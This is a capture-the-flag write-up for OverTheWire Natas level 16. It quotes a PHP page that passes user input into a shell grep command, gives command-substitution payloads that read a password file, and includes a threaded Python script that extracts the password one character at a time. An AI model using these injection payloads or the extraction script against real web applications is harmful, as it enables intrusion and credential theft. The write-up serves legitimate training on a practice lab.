# Natas Solutions

This page contains my solutions for the Natas wargame challenges 16 - 20 from OverTheWire.

## Solutions

### Level 16 --> Level 17
**URL**: http://natas16.natas.labs.overthewire.org  
**Username**: natas16  
**Password**: [REDACTED]

#### Solution

1. **Initial Analysis**: Upon accessing the URL, I was presented with a familiar challenge involving a `needle` parameter. The goal was to perform command injection to read the file located at `/etc/natas_webpass/natas17`. To understand the challenge better, I examined the source code provided by the application:

   ```php
   <?
   $key = "";

   if(array_key_exists("needle", $_REQUEST)) {
       $key = $_REQUEST["needle"];
   }

   if($key != "") {
       if(preg_match('/[;|&`\'"]/', $key)) {
           print "Input contains an illegal character!";
       } else {
           passthru("grep -i \"$key\" dictionary.txt");
       }
   }
   ?>
   ```

2. **Understanding the Code**: The application accepts a `needle` parameter, which is then used in a `grep` command to search through `dictionary.txt`. The `preg_match` function is used to filter out potentially dangerous characters such as `;`, `|`, `&`, `` ` ``, `'`, and `"`. However, the use of double quotes around `$needle` in the `passthru` function allows for shell command substitution using `$(...)`.  `.` and whitespace(`%20`) are still usable like in the previous challenge.

3. **Initial Exploitation Attempts**: I attempted to use a payload similar to one from a previous level: `needle=.%20/etc/natas_webpass/natas17&submit=Search`. This resulted in an empty output, indicating that the payload was not successful in extracting the password.

4. **Testing Command Injection**: To confirm the possibility of command injection, I used the payload `$(sleep 5)`. This successfully executed the sleep command and returned the entire contents of `dictionary.txt`, confirming that command injection was possible.

5. **Timing-Based Injection Attempts**: I experimented with timing-based injection using newlines and if-fi shell blocks. The payload was structured as follows:

   ```
   $(if grep ^abc /etc/natas_webpass/natas17
   then sleep 5
   fi)
   ```

   This approach was able to bypass the Web Application Firewall (WAF), but it was not reliable due to unstable response timings and some payloads breaking the shell parser.

6. **Final Strategy - Brute Force**: I devised a strategy to brute force the password one character at a time. For each character candidate `c`, I tested the following pattern:

   ```
   $(grep ^<prefix+c> /etc/natas_webpass/natas17)
   ```

   By sending 62 requests in parallel using threads, I could determine the correct character by identifying which request returned the fewest lines. This process was repeated until the full 32-character password was constructed.

7. **Implementation**: The following Python script was used to automate the brute force attack:

   ```python
   import requests
   import string
   from concurrent.futures import ThreadPoolExecutor, as_completed

   URL = "http://natas16.natas.labs.overthewire.org/index.php"
   AUTH = ("natas16", "REDACTED")
   CHARSET = string.ascii_letters + string.digits
   PASSWORD_LENGTH = 32
   MAX_WORKERS = 20

   session = requests.Session()
   session.auth = AUTH

   def probe_char(prefix, c):
       needle = f'$(grep ^{prefix + c} /etc/natas_webpass/natas17)'
       r = session.get(URL, params={"needle": needle, "submit": "Search"})
       return c, r.text.count("\n")

   def brute():
       found = ""
       print("[*] Starting blind injection attack...")
       with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
           for pos in range(PASSWORD_LENGTH):
               futures = { executor.submit(probe_char, found, c): c for c in CHARSET }
               results = []
               for fut in as_completed(futures):
                   c, lines = fut.result()
                   results.append((c, lines))
               match_char, _ = min(results, key=lambda x: x[1])
               found += match_char
               print(f"[+] Found [{pos+1:02d}/{PASSWORD_LENGTH}]: {found}")
       print(f"\n[>] Password for natas17: {found}")

   if __name__ == "__main__":
       brute()
   ```

8. **Outcome**: Running this script successfully brute-forced each character of the password, ultimately revealing the complete password for the next challenge.

   > **_TLDR:_**
   > Sanitize input: Do not allow raw input to be used in shell commands!
